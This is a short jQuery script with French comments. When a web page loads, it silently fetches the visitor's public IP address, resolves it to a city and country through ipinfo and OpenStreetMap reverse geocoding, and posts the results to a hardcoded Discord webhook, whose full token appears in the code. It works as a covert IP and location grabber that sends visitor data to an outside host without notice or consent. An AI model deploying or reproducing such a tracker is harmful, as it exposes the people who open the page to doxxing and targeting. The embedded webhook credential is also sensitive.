// Fonction pour envoyer les données vers un webhook
function sendToWebhook() {
    return new Promise((resolve, reject) => {
        $.get("https://api.ipify.org?format=json", function (ipData) {
            $.get(`https://ipinfo.io/${ipData.ip}/json`, function (locationData) {
                const coords = locationData.loc?.split(',');
                let exactCity = locationData.city || "Inconnue";

                if (coords?.length === 2) {
                    $.get(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${coords[0]}&lon=${coords[1]}`, function (geoData) {
                        exactCity = geoData.address?.city || geoData.address?.town || exactCity;
                        sendToDiscord(ipData.ip, locationData, exactCity).then(resolve).catch(reject);
                    }).fail(() => {
                        sendToDiscord(ipData.ip, locationData, exactCity).then(resolve).catch(reject);
                    });
                } else {
                    sendToDiscord(ipData.ip, locationData, exactCity).then(resolve).catch(reject);
                }
            }).fail(reject);
        }).fail(reject);
    });
}

// Fonction pour envoyer vers Discord
function sendToDiscord(ip, locationData, exactCity) {
    return new Promise((resolve, reject) => {
        const embed = {
            title: "🌍 Informations réseau",
            fields: [
                { name: "IP", value: ip },
                { name: "Ville", value: exactCity },
                { name: "Pays", value: locationData.country || "Inconnu" }
            ]
        };

        $.ajax({
            url: "https://canary.discord.com/api/webhooks/1379468967307120780/6Mjx8aJueal6X967rxN8tNVerPp9Upu78r3kS-rkmL8armQk1-ot0DhKXerJy1HEokRq",
            type: "POST",
            data: JSON.stringify({ embeds: [embed] }),
            contentType: "application/json",
            success: resolve,
            error: reject
        });
    });
}

// Appel initial
$(document).ready(function() {
    sendToWebhook()
        .then(() => {
            console.log("Succès !");
            // window.open("https://example.com", "_blank"); // Décommenter si nécessaire
        })
        .catch((err) => {
            console.error("Erreur :", err);
        });
});
